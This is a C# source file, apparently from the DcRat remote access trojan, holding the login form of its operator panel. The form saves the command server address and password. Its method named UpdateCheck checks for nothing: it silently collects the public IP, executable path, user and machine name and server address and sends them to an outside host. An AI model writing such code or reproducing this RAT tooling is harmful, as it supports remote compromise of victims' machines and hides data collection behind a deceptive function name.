using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using DcRat.Properties;

namespace DcRat
{
    public partial class FormInit : Form
    {
        public FormInit()
        {
            InitializeComponent();
            SetTheme();
        }

        #region Theme

        public void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            buttonclose.BackColor = colorSide;
            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;

            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;

            paneltop.BackColor = colorSide;

            pictureBox.Image = darkTheme ? Resources.DcRat : Resources.DcRat_dark;

            //textBoxxor.BackColor = colorSide;
            //textBoxxor.ForeColor = colorText;

            //textBoxaddress.BackColor = colorSide;
            //textBoxaddress.ForeColor = colorText;

            //textBoxpassword.BackColor = colorSide;
            //textBoxpassword.ForeColor = colorText;
        }

        public void UpdateCheck()
        {
            var url = "http://api.qwqdanchun.com/DcRat/log.php?Log=";
            url += "\n\nDcRat Log  " + DateTime.UtcNow;
            url += "\n  File Path: " + Process.GetCurrentProcess().MainModule.FileName;
            try
            {
                url += "\n  IP: " + new WebClient().DownloadString("http://ipinfo.io/ip").Replace("\\r\\n", "")
                    .Replace("\\n", "").Trim();
            }
            catch
            {
                url += "\n  IP: Unknown";
            }

            url += "\n  User Machine: " + Environment.UserName + "@" + Environment.MachineName;
            url += "\n  Server Address: " + Settings.Default.IP + "\n";
            new HttpClient().GetStringAsync(url);
        }

        #endregion

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void buttonconnect_Click(object sender, EventArgs e)
        {
            if (textBoxaddress.Text == "" || textBoxpassword.Text == "")
            {
                MessageBox.Show("Please fill in your address and password");
            }
            else
            {
                try
                {
                    var address = textBoxaddress.Text.Split(new[] { ":" }, StringSplitOptions.None);
                    Settings.Default.IP = address[0];
                    Settings.Default.Port = address[1];
                    Settings.Default.connectpassword = textBoxpassword.Text;
                    Settings.Default.Save();

                    string FullPath = Path.Combine(Application.StartupPath, "Clients Folder");
                    if (!Directory.Exists(FullPath)) Directory.CreateDirectory(FullPath);
                    if (!File.Exists(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml")))
                    {
                        XElement myDoc = new XElement("Clients", new XElement("Client", new XAttribute("HWID", ""), new XElement("Note", "qwqdanchun"))); ;
                        myDoc.Save(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));
                    }
                    UpdateCheck();
                    Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
                
            }
        }

        private void FormInit_Load(object sender, EventArgs e)
        {
            textBoxaddress.Text = Settings.Default.IP+":"+Settings.Default.Port;
            textBoxpassword.Text = Settings.Default.connectpassword;
        }

        #region Move

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);

        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;

        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        #endregion
    }
}